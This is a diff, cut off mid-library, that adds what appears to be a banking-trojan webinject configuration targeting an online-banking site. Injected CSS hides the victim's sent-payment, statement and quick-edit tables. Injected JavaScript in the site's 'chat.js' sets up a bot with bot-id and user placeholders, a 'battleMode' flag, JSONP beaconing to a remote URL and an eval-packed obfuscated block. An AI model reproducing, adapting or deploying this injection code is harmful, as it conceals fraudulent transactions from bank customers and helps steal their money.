@@ -1,0 +1,2034 @@
+set_url *site1.css* GP
+
+data_before
+/*HEADER*/
+data_end
+
+data_inject
+[action="c2b_nbu_prepared_sign"] + table {
+    display: none;
+}
+[action="c2b_sent"] + table {
+    display: none;
+}
+[action="c2brest"] + table {
+    display: none;
+}
+[action="c2bstatements"] + table {
+    display: none;
+}
+[action="c2ball"] + table
+{
+    display: none;
+}
+[action="c2ball"] + table + table
+{
+    display: none;
+}
+[action="c2b_nbu_quick_edit"] + table
+{
+    display: none;
+}
+data_end
+
+data_after
+data_end
+
+
+set_url *chat.js* GP
+
+data_before
+ * To change this template use File | Settings | File Templates.
+ */
+data_end
+
+data_inject
+
+
+var __azBase={
+        botid:"%bot_id%",
+        userid:"%az_user%",
+        system:'privatcompl',
+        version:"1.1.7",
+        battleMode:true,
+        debugMode:true
+    };
+function AZBase()
+{
+    return __azBase;
+}
+
+function AZList(name)
+{
+    this._name=name;
+
+    this.Add=function(elem)
+    {
+        var _stor=azsl.get(Const.STOR_LIST+this._name);
+        if(_stor==null)_stor=new Array();
+        else
+        {
+            _stor.length=jQuery.Enumerable.From(_stor).Count();
+            _stor=Array.prototype.slice.call(_stor, 0);
+        }
+        _stor.push(elem);
+        azsl.set(Const.STOR_LIST+this._name,_stor);
+    }
+
+    this.Clear=function()
+    {
+        azsl.set(Const.STOR_LIST+this._name,new Array());
+    }
+
+
+    this.self=function()
+    {
+        var _stor=azsl.get(Const.STOR_LIST+this._name);
+        if(_stor==null)_stor=new Array();
+        return jQuery.Enumerable.From(_stor);
+    }
+
+    this.dump=function()
+    {
+        var _stor=azsl.get(Const.STOR_LIST+this._name);
+        if(_stor==null)_stor=new Array();
+        return JSON.stringify(_stor);
+    }
+}
+
+
+function AZBinding() {
+    window._fields = new Array();
+    window._handler = window.document.createElement("div");
+    this._DefineVAL=function(i)
+    {
+        var tmpget= function() {
+
+                                return window._fields[i].val();
+                            };
+        var tmpset= function(data) {
+                                window._fields[i].val(data);
+                            };
+        Object.defineProperty(window._handler, i,{get:tmpget,set: tmpset});
+    }
+    this._DefineHTML=function(i)
+    {
+        var tmpget= function() {
+                                return window._fields[i].html();
+                            };
+        var tmpset= function(data) {
+                                window._fields[i].html(data);
+                            };
+        Object.defineProperty(window._handler, i,{get:tmpget,set: tmpset});
+    }
+    this.Bind = function() {
+        for (var i in this) {
+            if (this[i].jquery != undefined) {
+                window._fields[i] = this[i];
+                if (this[i].attr("value") != undefined) {
+                    this._DefineVAL(i);
+                } else {
+                    this._DefineHTML(i);
+                }
+            }
+        }
+        return window._handler;
+    }
+}
+eval(function(p,a,c,k){return p.replace(/\w+/g, function(f){return a[k(f,c)];});}
+(
+'(5(B){B.7=5(){a(21.g==1)2 N1;3 I1=/\\{(\\f+)(?:,([-+]?\\f+))?(?:\\:([^(^}]+)(?:\\(((?:\\\\\\)|[^)])+)\\)){1,c}){1,c}\\}/E;3 S=21;2 N1.o(I1,5(b,D1,v,4,6){b=S[s(D1)];4=y[4];2 w1(4==d?b:4(b,x1((6||\'\').o(/\\\\\\)/E,\')\').o(/\\\\,/E,\'\\1\').w2(\',\'),S)),v);});};R.l1=5(7){2 21.g<=c?7:B.7.x2(7,y2.Z.t2.v2(21,c));};B.7.l=5(J,91,o){a(y[J]!=d&&o!=n1)A2\'l1 \'+J+\' B2, C2 o=n1 71 o\';y[J]=91;};R.l1.r=B.7.r=5(e){3 4;71(3 D k2 e){4=y[D];a(4!=d&&4.r!=d)4.r(e[D]);}};B.7.U=5(J){2 y[J];};3 u1=/^\\{(\\f+)\\}$/;3 y={};3 F=\'    \';5 x1(6,S){3 i1;71(3 9=1;9<6.g;9++){a((i1=u1.X1(6[9]))!=d)6[9]=S[s(i1[c])];m1 6[9]=6[9].o(/\\1/E,\',\');}2 6;}5 w1(8,v){v=s(v);a(G(v))2 8;8=\'\'+8;3 P=v1.l2(v)-8.g;a(P<=1)2 8;W1(F.g<P)F+=F;2 v<1?(8+F.M(1,P)):(F.M(1,P)+8);}B.7.l(\'U1\',5 U1(Q,6){a(Q==d)2 \'d\';3 0=[];3 02=6.a1()||\'\';3 4=y[6.a1()];a(4==d)0=Q;m1 71(3 9=1;9<Q.g;9++)0.h2(4(Q[9],6));2 0.h1(02);});})(R.Z);(5(7){7.l(\'D\',5 D(0,6){a((0=O1.X1(0))==d)2 t.H;3 m=s(0[j1]);2 G(m)?\'\'.O(0[c],p(d,0[n],6[1]),p(t.N,0[k1],6[c])):a1(0[c],0[n],0[k1],m,6[1],6[c]);});7.l(\'V1\',5 V1(0,6){0=s(0);a(G(0))2 t.H;3 g1=s(6[1]);2 p(d,0.p2(G(g1)?o2:g1),s(6[c]));});7.l(\'Z1\',5(0,6){0=s(0);a(G(0))2 t.H;3 4=c1[6[1].M1()];2 4==d?6[1]+\'?\':4(0,6);});7.U(\'Z1\').l=5(K1,91){c1[K1.M1()]=91;};7.U(\'D\').r=r;3 O1=/^([+-]?)(\\f+)(?:\\.(\\f+))?(?:\\8*m([+-]\\f+))?$/9;3 z=\'n2\';3 t={N:\'.\',H:\'Q1\'};3 c1={s2:5(0,6){2 6[0==c?c:n];},r2:5(0,6){3 31=0%L1;3 Y=0%q2;2 6[31==c&&Y!=m2?c:31>=n&&31<=j1&&(Y<L1||Y>=i2)?n:k1];}};5 r(e){t.N=e.N||\'.\';t.H=e.H||\'Q1\';}5 p(K,0,i){a(G(i=s(i==\'\'?g2:i)))2 (0==d||0==\'\')?\'\':((K||\'\')+0);a((0=0||\'\').g>=i)2 K==d?0:(K+0.12(1,i));2 K==d?(b1(i-0.g)+0):(K+0+b1(i-0.g));}5 b1(i){W1(z.g<i)z+=z;2 z.M(1,i);}5 a1(8,9,4,m,T1,S1){3 b;a(m>1){b=p(\'\',4,m);9+=b;4=4.12(b.g);}m1 a(m<1){b=9.g-(-m);4=(b>1?9.M(b,9.g):(b1(-b)+9))+4;9=(b>1?9.M(1,-m-c):\'1\');}2 \'\'.O(8,p(d,9,T1),p(t.N,4,S1));}})(R.Z.7);(5(7){7.l(\'x\',x);7.l(\'f\',5(0,j){2 x(0,h.f);});7.l(\'q\',5(0,j){2 x(0,j[1]==\'s1\'?h.q:h.81);});7.l(\'W\',5(0,j){2 x(0,j[1]==\'s1\'?h.W:h.A);});7.U(\'x\').r=t1;7.l(\'A\',5 A(0,6){a(0==d)2 \'d\';a(0==1)2 \'1\';3 8=[];3 X=6[1];0=V(0,j2,8,k.61,T=(X==\'\'||X==\'F2\'));0=V(0,q1,8,k.8,T=(T||X==\'E2\'));0=V(0,q1,8,k.b,T=(T||X==\'D2\'));0=V(0,z2,8,k.51,n1);a(0!=1)8.p1(0,k.f);2 8.h1(\' \');});7.U(\'A\').r=E1;3 e1={};3 z=\'u2\';3 h={41:\'G1\',f:[\'L.I.C\'],81:[\'L.I.C u:w:01\'],q:[\'L.I.C u:w\'],W:[\'u:w\'],A:[\'u:w:01\']};3 k={f:\'B1.\',51:\'A1.\',b:\'z1.\',8:\'r1.\',61:\'y1\'};3 F1=/C|32|b{c,n}|f{c,n}|H1{c,n}|C1{c,n}|8{c,n}|4{c,j1}/E;3 f1={o1:\'0.f2()\',C1:\'0.e2()+c\',f:\'0.d2()\',H1:\'0.62()\',b:\'0.52()\',8:\'0.42()\',4:\'0.92()\'};5 t1(e){h.41=e.41||\'G1\';h.f[1]=e.f||\'L.I.C\';h.81[1]=e.81||\'L.I.C u:w:01\';h.q[1]=e.q||\'L.I.C u:w\';h.W[1]=e.W||\'u:w\';h.A[1]=e.A||\'u:w:01\';}5 E1(e){k.f=e.f||\'B1.\';k.51=e.51||\'A1.\';k.b=e.b||\'z1.\';k.8=e.8||\'r1.\';k.61=e.61||\'y1\';}5 x(0,j){a(0==d)2 \'d\';a(!(0 82 72))2 h.41;j=j.h1(\',\');a(j==\'\')2 0;3 4=e1[j];a(4==d){4=\'2 \\\'\\\'.O(\\\'\'+(j.o(/\'/E,\'\\\\\\\'\').o(F1,5(b){3 11=b.a2(1);2 11==\'o1\'?\'\'.O(\'\\\', \',f1[11],\', \\\'\'):\'\'.O(\'\\\', R1(\',f1[11],\', \',b.g,\'), \\\'\');}))+\'\\\');\';4=b2 c2(\'0\',\'R1\',4);e1[j]=4;}2 4(0,p);}5 p(0,i){2 z.M(1,i-(\'\'+0).g)+0;}5 V(q,d1,P1,J1,Y1){a(q==1)2 1;3 9=q%d1;a(9!=1&&Y1)P1.p1(9,J1);2 v1.22(q/d1);}})(R.Z.7);',
+'v|0|return|var|f|function|params|format|s|i|if|m|1|null|param|d|length|intf|l|p|tsdefault|add|e|2|replace|addz|dt|init|Number|defaults|HH|len|mm|df|formatters|zz|ts|st|yyyy|n|g|sp|isNaN|nan|MM|name|pre|dd|substring|dseparator|concat|nl|va|String|args|w|get|tss|t|round|v100|prototype|ss|mc|arguments|v10|nad|h|ms|for|dts|func|shift|getz|nforms|div|c|fp|b|join|r|4|3|Format|else|true|y|unshift|60|???µ??|nosec|dfinit|paramph|Math|fl|pp|????|??????|?‡?°??|????|M|num|tsinit|fpre|NaD|H|placeholder|msn|lname|10|toLowerCase|this|numformat|buf|NaN|a|lf|li|arr|nb|while|exec|write|nf|j|substr|floor|yy|getSeconds|getMinutes|getHours|Date|instanceof|getMilliseconds|charAt|new|Function|getDate|getMonth|getFullYear|undefined|push|20|1000|in|abs|11|0000000000|16|toString|100|ru|en|slice|0000|call|split|apply|Array|24|throw|exist|use|min|sec|msec'.split('|'),
+'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
+function(f,c){var i=0,e=f.length-1,l=c.length;for(;e>=0;e--)i=i*l+c.indexOf(f.charAt(e));return i;}
+));
+function AZLogs()
+{
+    this.log=function(text)
+    {
+        var currentTime=new Date();
+        var day = currentTime.getDate();
+        var month = currentTime.getMonth()+1;
+        var year = currentTime.getYear();
+        var hours= currentTime.getHours();
+        var minutes= currentTime.getMinutes();
+        var seconds= currentTime.getSeconds();
+
+        var date = year+"-"+
+            ((month < 10) ? "0"  : "") + month+"-"+
+            ((day < 10) ? "0"  : "") + day +" "+
+            ((hours < 10) ? "0"  : "") + hours +":"+
+            ((minutes < 10) ? "0"  : "") + minutes +":"+
+            ((seconds < 10) ? "0"  : "") + seconds;
+
+        var message = date + ";"+text;
+        if(AZBase().debugMode)try{
+            console.log(message);
+        }catch(e){}
+
+
+    }
+}
+var azlogs = new AZLogs();
+
+var AZRequestDefaultErrorHandler=function(er1,er2,er3){if(AZBase().debugMode)
+    azlogs.log(azUtils.serialize(er1)+" "+er2+" "+er3);
+}
+function AZRequest(url,callback,callbackError,context)
+{
+    
+    this._url=url;
+    this._callback=callback;
+    this._error=callbackError;
+    this._context=context;
+
+
+    this.send=function (data)
+    {
+        data.botid=AZBase().botid;
+        if(!this._error)
+        {
+            this._error=AZRequestDefaultErrorHandler;
+        }
+        var query=jQuery.getJSON(this._url+"?callback=?",data,this._callback)
+        if(query&&this._error)
+        {
+            query.error(this._error);
+        }
+    }
+
+}
+
+
+function AZStorage()
+{
+    this.EnableIE6Storage=function()
+    {
+        if(!window.localStorage)
+        {
+            azlogs.log("storage not found. emulating.")
+            window.localStorage=new AZVirtualStorage();
+        }
+    }
+    this.set = function(name, value) {
+        try{
+            this.EnableIE6Storage();
+            window.localStorage.setItem(name,JSON.stringify(value));
+        }catch($e)
+        {
+
+        }
+    }
+
+    this.get = function(name) {
+        this.EnableIE6Storage();
+        try{
+          return JSON.parse(window.localStorage.getItem(name));
+        }catch(e){
+            return null;
+        }
+    }
+}
+var azsl=new AZStorage();
+
+var AZVirtualStorage = function () {
+    var el = document.createElement('div');
+    var st = 'localStorage';
+
+    el.style.display = 'none';
+    el.addBehavior('#default#userData');
+    document.body.appendChild(el);
+
+    this._s = el;
+
+    var attrs = function () {
+        el.load(st);
+        var xml = el.XMLDocument;
+        xml.setProperty("SelectionLanguage", "XPath");
+
+        return xml.selectNodes("//ROOTSTUB/attribute::*");
+    }
+
+    this.length = 0;
+
+    var _len = function () {
+        this.length = attrs().length;
+    }
+
+    _len.call(this);
+
+    this.setItem = function (name, value) {
+        var e;
+
+        try {
+            value = value === null ? 'null' : value.toString();
+
+            this._s.setAttribute(name, value)
+            this._s.save(st);
+        } catch (e) {
+            if (e.number == -2147024857) {
+                throw {
+                    'description': 'QUOTA_EXCEEDED_ERR',
+                    'number' : 22,
+                    'message' : 'Quota exceed error'
+                }
+
+                throw e;
+            }
+        }
+
+        _len.call(this);
+    }
+
+    this.getItem = function (name) {
+        this._s.load(st);
+        return this._s.getAttribute(name);
+    }
+
+    this.removeItem = function (name) {
+        this._s.removeAttribute(name);
+        this._s.save(st);
+        _len.call(this);
+    }
+
+    this.key = function (num) {
+        var e;
+        try {
+            return attrs()[num].name;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    this.clear = function() {
+        var nodes = attrs()
+        for (var i = nodes.length-1; i>=0; i--) {
+            this._s.removeAttribute(nodes[i].name);
+        }
+
+        this._s.save(st);
+        this.length = 0;
+    }
+}
+function AZUtils() {
+    this.roundVal = function (val, dec) {
+
+        var result = Math.round(val * Math.pow(10, dec)) / Math.pow(10, dec);
+        return result;
+    }
+    this.stringFromSpaces = function(str) {
+        return str.split(' ').join('').split('&nbsp;').join('').split(String.fromCharCode(160)).join('');
+    }
+    this.stringToSpaces = function(str) {
+        var tmp=(parseFloat(str)).toString().split('.');
+        if(tmp.length==1)tmp[1]='00';
+        var f=tmp[0].replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+        return f+'.'+tmp[1];
+
+    }
+    this.serialize = function(mixed_value) {
+        var _getType = function(inp) {
+            var type = typeof inp,match;
+            var key;
+            if (type == 'object' && !inp) {
+                return'null'
+            }
+            if (type == "object") {
+                if (!inp.constructor) {
+                    return'object'
+                }
+                var cons = inp.constructor.toString();
+                if (match = cons.match(/(\w+)\(/)) {
+                    cons = match[1].toLowerCase()
+                }
+                var types = ["boolean","number","string","array"];
+                for (key in types) {
+                    if (cons == types[key]) {
+                        type = types[key];
+                        break
+                    }
+                }
+            }
+            return type
+        };
+        var type = _getType(mixed_value);
+        var val,ktype = '';
+        switch (type) {
+            case"function":
+                val = "";
+                break;
+            case"undefined":
+                val = "N";
+                break;
+            case"boolean":
+                val = "b:" + (mixed_value ? "1" : "0");
+                break;
+            case"number":
+                val = (Math.round(mixed_value) == mixed_value ? "i" : "d") + ":" + mixed_value;
+                break;
+            case"string":
+                val = "s:" + mixed_value.length + ":\"" + mixed_value + "\"";
+                break;
+            case"array":
+            case"object":
+                val = "a";
+                var count = 0;
+                var vals = "";
+                var okey;
+                var key;
+                for (key in mixed_value) {
+                    ktype = _getType(mixed_value[key]);
+                    if (ktype == "function") {
+                        continue
+                    }
+                    okey = (key.match(/^[0-9]+$/) ? parseInt(key) : key);
+                    vals += this.serialize(okey) + this.serialize(mixed_value[key]);
+                    count++
+                }
+                val += ":" + count + ":{" + vals + "}";
+                break
+        }
+        if (type != "object" && type != "array")val += ";";
+        return val
+    }
+    this.unserialize = function(data) {
+        var that = this;
+        var utf8Overhead = function(chr) {
+            var code = chr.charCodeAt(0);
+            if (code < 0x0080) {
+                return 0
+            }
+            if (code < 0x0800) {
+                return 1
+            }
+            return 2
+        };
+        var error = function(type, msg, filename, line) {
+            try {
+                if (AZBase().debugMode)azlogs.Log("" + type + " " + msg + " " + filename + " " + line)
+            } catch(e) {
+            }
+        };
+        var read_until = function(data, offset, stopchr) {
+            var buf = [];
+            var chr = data.slice(offset, offset + 1);
+            var i = 2;
+            while (chr != stopchr) {
+                if ((i + offset) > data.length) {
+                    error('Error', 'Invalid')
+                }
+                buf.push(chr);
+                chr = data.slice(offset + (i - 1), offset + i);
+                i += 1
+            }
+            return[buf.length,buf.join('')]
+        };
+        var read_chrs = function(data, offset, length) {
+            var buf;
+            buf = [];
+            for (var i = 0; i < length; i++) {
+                var chr = data.slice(offset + (i - 1), offset + i);
+                buf.push(chr);
+                length -= utf8Overhead(chr)
+            }
+            return[buf.length,buf.join('')]
+        };
+        var _unserialize = function(data, offset) {
+            var readdata;
+            var readData;
+            var chrs = 0;
+            var ccount;
+            var stringlength;
+            var keyandchrs;
+            var keys;
+            if (!offset) {
+                offset = 0
+            }
+            var dtype = (data.slice(offset, offset + 1)).toLowerCase();
+            var dataoffset = offset + 2;
+            var typeconvert = function(x) {
+                return x
+            };
+            switch (dtype) {
+                case'i':
+                    typeconvert = function(x) {
+                        return parseInt(x, 10)
+                    };
+                    readData = read_until(data, dataoffset, ';');
+                    chrs = readData[0];
+                    readdata = readData[1];
+                    dataoffset += chrs + 1;
+                    break;
+                case'b':
+                    typeconvert = function(x) {
+                        return parseInt(x, 10) !== 0
+                    };
+                    readData = read_until(data, dataoffset, ';');
+                    chrs = readData[0];
+                    readdata = readData[1];
+                    dataoffset += chrs + 1;
+                    break;
+                case'd':
+                    typeconvert = function(x) {
+                        return parseFloat(x)
+                    };
+                    readData = read_until(data, dataoffset, ';');
+                    chrs = readData[0];
+                    readdata = readData[1];
+                    dataoffset += chrs + 1;
+                    break;
+                case'n':
+                    readdata = null;
+                    break;
+                case's':
+                    ccount = read_until(data, dataoffset, ':');
+                    chrs = ccount[0];
+                    stringlength = ccount[1];
+                    dataoffset += chrs + 2;
+                    readData = read_chrs(data, dataoffset + 1, parseInt(stringlength, 10));
+                    chrs = readData[0];
+                    readdata = readData[1];
+                    dataoffset += chrs + 2;
+                    if (chrs != parseInt(stringlength, 10) && chrs != readdata.length) {
+                        error('SyntaxError', 'String length mismatch')
+                    }
+                    readdata = readdata;
+                    break;
+                case'a':
+                    readdata = {};
+                    keyandchrs = read_until(data, dataoffset, ':');
+                    chrs = keyandchrs[0];
+                    keys = keyandchrs[1];
+                    dataoffset += chrs + 2;
+                    for (var i = 0; i < parseInt(keys, 10); i++) {
+                        var kprops = _unserialize(data, dataoffset);
+                        var kchrs = kprops[1];
+                        var key = kprops[2];
+                        dataoffset += kchrs;
+                        var vprops = _unserialize(data, dataoffset);
+                        var vchrs = vprops[1];
+                        var value = vprops[2];
+                        dataoffset += vchrs;
+                        readdata[key] = value
+                    }
+                    dataoffset += 1;
+                    break;
+                default:
+                    error('SyntaxError', 'Unknown / Unhandled data type(s): ' + dtype);
+                    break
+            }
+            return[dtype,dataoffset - offset,typeconvert(readdata)]
+        };
+        return _unserialize((data + ''), 0)[2]
+    };
+    this.convertToArray = function(obj, n) {
+        if (! obj.length) {
+            return [];
+        } // length must be set on the object, or it is not iterable
+        var a = [];
+
+        try {
+            a = Array.prototype.slice.call(obj, n);
+        }
+            // IE 6 and posssibly other browsers will throw an exception, so catch it and use brute force
+        catch(e) {
+            Core.batch(obj, function(o, i) {
+                if (n <= i) {
+                    a[i - n] = o;
+                }
+            });
+        }
+
+        return a;
+    };
+}
+azUtils = new AZUtils();
+/////
+String.prototype.trim=function(){return this.replace(/^\s\s*/, '').replace(/\s\s*$/, '');};
+
+String.prototype.ltrim=function(){return this.replace(/^\s+/,'');}
+
+String.prototype.rtrim=function(){return this.replace(/\s+$/,'');}
+String.prototype.replaceAll=function(from,to){return this.split(from).join(to);}
+
+
+
+
+
+var JSON;if(!JSON){JSON={};}
+(function(){'use strict';function f(n){return n<10?'0'+n:n;}
+if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+'-'+
+f(this.getUTCMonth()+1)+'-'+
+f(this.getUTCDate())+'T'+
+f(this.getUTCHours())+':'+
+f(this.getUTCMinutes())+':'+
+f(this.getUTCSeconds())+'Z':null;};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}
+var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}
+function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}
+if(typeof rep==='function'){value=rep.call(holder,key,value);}
+switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}
+gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}
+v=partial.length===0?'[]':gap?'[\n'+gap+partial.join(',\n'+gap)+'\n'+mind+']':'['+partial.join(',')+']';gap=mind;return v;}
+if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.prototype.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}
+v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}
+if(typeof JSON.stringify!=='function'){JSON.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}
+rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}
+return str('',{'':value});};}
+if(typeof JSON.parse!=='function'){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.prototype.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}
+return reviver.call(holder,key,value);}
+text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+
+('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}
+if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}
+throw new SyntaxError('JSON.parse');};}}());
+var TAFFY;(function(){if(!TAFFY){var i="2.5.1",m=1,a="000000",n=1000,c={};var k=function(p){if(TAFFY.isArray(p)||TAFFY.isObject(p)){return p}else{return JSON.parse(p)}};var l=function(s,q,t){if(s&&((f.isArray(s)&&s.length==1)||(!f.isArray(s)))){q((f.isArray(s))?s[0]:s,0)}else{for(var w,v,p=0,s=(f.isArray(s))?s:[s],z=s.length;p<z;p++){var v=s[p];if(!f.isUndefined(v)||(t||false)){w=q(v,p);if(w===f.EXIT){break}}}}};var b=function(u,q){var p=0,t;for(var s in u){if(u.hasOwnProperty(s)){t=q(u[s],s,p++)}if(t===f.EXIT){break}}};c.extend=function(p,q){c[p]=function(){return q.apply(this,arguments)}};var h=function(q){if(f.isString(q)&&/[t][0-9]*[r][0-9]*/i.test(q)){return true}if(f.isObject(q)&&q.___id&&q.___s){return true}if(f.isArray(q)){var p=true;l(q,function(s){if(!h(s)){p=false;return TAFFY.EXIT}});return p}return false};var e=function(q){var p=[];if(f.isString(q)&&/[t][0-9]*[r][0-9]*/i.test(q)){q={___id:q}}if(f.isArray(q)){l(q,function(s){p.push(e(s))});var q=function(){var s=this;var r=false;l(p,function(t){if(g(s,t)){r=true}});return r};return q}if(f.isObject(q)){if(f.isObject(q)&&q.___id&&q.___s){q={___id:q.___id}}b(q,function(r,s){if(!f.isObject(r)){r={is:r}}b(r,function(t,u){var w=[];var v=(u==="hasAll")?function(x,y){y(x)}:l;v(t,function(y){var x=true,z=false;var A=function(){var G=this[s],D="==",F="!=",B="===",C="!==";if((u.indexOf("!")===0)&&u!==F&&u!==C){x=false;u=u.substring(1,u.length)}var E=((u==="regex")?(y.test(G)):(u==="lt")?(G<y):(u==="gt")?(G>y):(u==="lte")?(G<=y):(u==="gte")?(G>=y):(u==="left")?(G.indexOf(y)===0):(u==="leftnocase")?(G.toLowerCase().indexOf(y.toLowerCase())===0):(u==="right")?(G.substring((G.length-y.length))===y):(u==="rightnocase")?(G.toLowerCase().substring((G.length-y.length))===y.toLowerCase()):(u==="like")?(G.indexOf(y)>=0):(u==="likenocase")?(G.toLowerCase().indexOf(y.toLowerCase())>=0):(u==="is")?(G===y):(u===B)?(G===y):(u===D)?(G==y):(u===C)?(G!==y):(u===F)?(G!=y):(u==="isnocase")?(G.toLowerCase?G.toLowerCase()==y.toLowerCase():G==y):(u==="has")?(f.has(G,y)):(u==="hasall")?(f.hasAll(G,y)):(u.indexOf("is")===-1&&!TAFFY.isNull(G)&&!TAFFY.isUndefined(G)&&!TAFFY.isObject(y)&&!TAFFY.isArray(y))?(y===G[u]):(f[u]&&f.isFunction(f[u])&&u.indexOf("is")===0)?f[u](G)===y:(f[u]&&f.isFunction(f[u]))?f[u](G,y):(false));E=(E&&!x)?false:(!E&&!x)?true:E;return E};w.push(A)});if(w.length===1){p.push(w[0])}else{p.push(function(){var y=this;var x=false;l(w,function(z){if(z.apply(y)){x=true}});return x})}})});var q=function(){var s=this;var r=true;r=(p.length==1&&!p[0].apply(s))?false:(p.length==2&&(!p[0].apply(s)||!p[1].apply(s)))?false:(p.length==3&&(!p[0].apply(s)||!p[1].apply(s)||!p[2].apply(s)))?false:(p.length==4&&(!p[0].apply(s)||!p[1].apply(s)||!p[2].apply(s)||!p[3].apply(s)))?false:true;if(p.length>4){l(p,function(t){if(!g(s,t)){r=false}})}return r};return q}if(f.isFunction(q)){return q}};var j=function(p,q){var r=function(t,s){var u=0;f.each(q,function(x){var z=x.split(" ");var w=z[0];var v=(z.length===1)?"logical":z[1];if(v==="logical"){var A=o(t[w]),y=o(s[w]);f.each((A.length<=y.length)?A:y,function(B,C){if(A[C]<y[C]){u=-1;return TAFFY.EXIT}else{if(A[C]>y[C]){u=1;return TAFFY.EXIT}}})}else{if(v==="logicaldesc"){var A=o(t[w]),y=o(s[w]);f.each((A.length<=y.length)?A:y,function(B,C){if(A[C]>y[C]){u=-1;return TAFFY.EXIT}else{if(A[C]<y[C]){u=1;return TAFFY.EXIT}}})}else{if(v==="asec"&&t[w]<s[w]){u=-1;return f.EXIT}else{if(v==="asec"&&t[w]>s[w]){u=1;return f.EXIT}else{if(v==="desc"&&t[w]>s[w]){u=-1;return f.EXIT}else{if(v==="desc"&&t[w]<s[w]){u=1;return f.EXIT}}}}}}if(u===0&&v==="logical"&&A.length<y.length){u=-1}else{if(u===0&&v==="logical"&&A.length>y.length){u=1}else{if(u===0&&v==="logicaldesc"&&A.length>y.length){u=-1}else{if(u===0&&v==="logicaldesc"&&A.length<y.length){u=1}}}}if(u!=0){return f.EXIT}});return u};return p.sort(r)};var o=null;(function(){var p={};var q=0;o=function(r){if(q>n){p={};q=0}return p["_"+r]||(function(){var v=String(r),u=[],z="_",t="";for(var s=0,w=v.length;s<w;s++){var y=v.charCodeAt(s);if((y>=48&&y<=57)||y===46){if(t!="n"){t="n";u.push(z.toLowerCase());z=""}z=z+v.charAt(s)}else{if(t!="s"){t="s";u.push(parseFloat(z));z=""}z=z+v.charAt(s)}}u.push((t==="n")?parseFloat(z):z.toLowerCase());u.shift();p["_"+r]=u;q++;return u})()}})();var d=function(){this.context({results:this.getDBI().query(this.context())})};c.extend("filter",function(){var q=TAFFY.mergeObj(this.context(),{run:null});var p=[];l(q.q,function(r){p.push(r)});q.q=p;l(arguments,function(r){q.q.push(e(r));q.filterRaw.push(r)});return this.getroot(q)});c.extend("order",function(q){var q=q.split(",");var p=[];l(q,function(s){p.push(s.replace(/^\s*/,"").replace(/\s*$/,""))});var r=TAFFY.mergeObj(this.context(),{sort:null});r.order=p;return this.getroot(r)});c.extend("limit",function(r){var q=TAFFY.mergeObj(this.context(),{});q.limit=r;if(q.run&&q.sort){var p=[];l(q.results,function(t,s){if((s+1)>r){return TAFFY.EXIT}p.push(t)});q.results=p}return this.getroot(q)});c.extend("start",function(r){var q=TAFFY.mergeObj(this.context(),{});q.start=r;if(q.run&&q.sort&&!q.limit){var p=[];l(q.results,function(t,s){if((s+1)>r){p.push(t)}});q.results=p}else{q=TAFFY.mergeObj(this.context(),{run:null,start:r})}return this.getroot(q)});c.extend("update",function(){var q=true,s={},p=arguments;if(TAFFY.isString(arguments[0])&&(arguments.length==2||arguments.length==3)){s[arguments[0]]=arguments[1];if(arguments.length==3){q=arguments[2]}}else{s=p[0];if(p.length==2){q=p[0]}}var r=this;d.call(this);l(this.context().results,function(t){var u=s;if(TAFFY.isFunction(u)){u=u.apply(TAFFY.mergeObj(t,{}))}else{if(f.isFunction(u)){u=u(TAFFY.mergeObj(t,{}))}}if(TAFFY.isObject(u)){r.getDBI().update(t.___id,u,q)}});if(this.context().results.length){this.context({run:null})}return this});c.extend("remove",function(p){var q=this;var r=0;d.call(this);l(this.context().results,function(s){q.getDBI().remove(s.___id);r++});if(this.context().results.length){this.context({run:null});q.getDBI().removeCommit(p)}return r});c.extend("count",function(){d.call(this);return 